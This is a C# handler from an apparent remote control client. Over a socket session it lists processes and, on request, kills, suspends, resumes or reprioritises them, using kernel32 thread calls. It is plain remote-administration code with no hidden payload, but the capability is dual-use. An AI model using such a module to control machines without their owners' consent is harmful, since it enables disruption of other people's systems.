using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestGetProcessesHandler : IRequestHandler
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        const uint THREAD_SUSPEND_RESUME = 0x0002;

        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_GET_PROCESSES_REQUEST)
            {
                new Thread(() => StartGetProcesses(session)) { IsBackground = true }.Start();
            }
            else if (reqType == ePacketType.PACKET_KILL_PROCESS_REQUEST)
            {
                var req = reqObj as RequestKillProcesses;
                new Thread(() =>
                {
                    StartKillProcesses(req);
                    StartGetProcesses(session);
                }) { IsBackground = true }.Start();
            }
            else if (reqType == ePacketType.PACKET_SUSPEND_PROCESS_REQUEST)
            {
                var req = reqObj as RequestKillProcesses;
                new Thread(() => SuspendProcesses(session, req)) { IsBackground = true }.Start();
            }
            else if (reqType == ePacketType.PACKET_RESUME_PROCESS_REQUEST)
            {
                var req = reqObj as RequestKillProcesses;
                new Thread(() => ResumeProcesses(session, req)) { IsBackground = true }.Start();
            }
            else if (reqType == ePacketType.PACKET_SET_PROCESS_PRIORITY_REQUEST)
            {
                var req = reqObj as RequestSetProcessPriority;
                new Thread(() => SetProcessPriority(session, req)) { IsBackground = true }.Start();
            }
        }

        static void StartGetProcesses(SocketSession session)
        {
            var resp = new ResponseGetProcesses();
            try
            {
                var processes = ProcessUtil.GetProcessProperyListBySimple();
                resp.Processes = processes;
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }
            session.Send(ePacketType.PACKET_GET_PROCESSES_RESPONSE, resp);
        }

        static void StartKillProcesses(RequestKillProcesses req)
        {
            if (req == null) return;
            var processList = Process.GetProcesses().ToList();
            for (int i = 0; i < req.ProcessIds.Count; i++)
            {
                try
                {
                    Process p = processList.Find(m => m.Id.ToString() == req.ProcessIds[i]);
                    if (p != null) p.Kill();
                }
                catch { }
            }
        }

        static void SuspendProcesses(SocketSession session, RequestKillProcesses req)
        {
            var resp = new ResponseProcessOperation { Operation = "Suspend" };
            try
            {
                var processList = Process.GetProcesses().ToList();
                foreach (string pidStr in req.ProcessIds)
                {
                    int pid;
                    if (!int.TryParse(pidStr, out pid)) continue;
                    Process p = processList.Find(m => m.Id == pid);
                    if (p == null) continue;
                    foreach (ProcessThread t in p.Threads)
                    {
                        IntPtr hThread = OpenThread(THREAD_SUSPEND_RESUME, false, (uint)t.Id);
                        if (hThread != IntPtr.Zero)
                        {
                            SuspendThread(hThread);
                            CloseHandle(hThread);
                        }
                    }
                    resp.ProcessId = pid;
                }
                resp.Result = true;
                resp.Message = "已挂起进程";
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }
            session.Send(ePacketType.PACKET_SUSPEND_PROCESS_RESPONSE, resp);
        }

        static void ResumeProcesses(SocketSession session, RequestKillProcesses req)
        {
            var resp = new ResponseProcessOperation { Operation = "Resume" };
            try
            {
                var processList = Process.GetProcesses().ToList();
                foreach (string pidStr in req.ProcessIds)
                {
                    int pid;
                    if (!int.TryParse(pidStr, out pid)) continue;
                    Process p = processList.Find(m => m.Id == pid);
                    if (p == null) continue;
                    foreach (ProcessThread t in p.Threads)
                    {
                        IntPtr hThread = OpenThread(THREAD_SUSPEND_RESUME, false, (uint)t.Id);
                        if (hThread != IntPtr.Zero)
                        {
                            ResumeThread(hThread);
                            CloseHandle(hThread);
                        }
                    }
                    resp.ProcessId = pid;
                }
                resp.Result = true;
                resp.Message = "已恢复进程";
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }
            session.Send(ePacketType.PACKET_RESUME_PROCESS_RESPONSE, resp);
        }

        static void SetProcessPriority(SocketSession session, RequestSetProcessPriority req)
        {
            var resp = new ResponseProcessOperation { Operation = "SetPriority", ProcessId = req.ProcessId };
            try
            {
                Process p = Process.GetProcessById(req.ProcessId);
                ProcessPriorityClass pc;
                switch (req.PriorityClass)
                {
                    case "Idle": pc = ProcessPriorityClass.Idle; break;
                    case "BelowNormal": pc = ProcessPriorityClass.BelowNormal; break;
                    case "Normal": pc = ProcessPriorityClass.Normal; break;
                    case "AboveNormal": pc = ProcessPriorityClass.AboveNormal; break;
                    case "High": pc = ProcessPriorityClass.High; break;
                    case "RealTime": pc = ProcessPriorityClass.RealTime; break;
                    default: pc = ProcessPriorityClass.Normal; break;
                }
                p.PriorityClass = pc;
                resp.Result = true;
                resp.Message = "优先级已设置为 " + req.PriorityClass;
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }
            session.Send(ePacketType.PACKET_SET_PROCESS_PRIORITY_RESPONSE, resp);
        }
    }
}
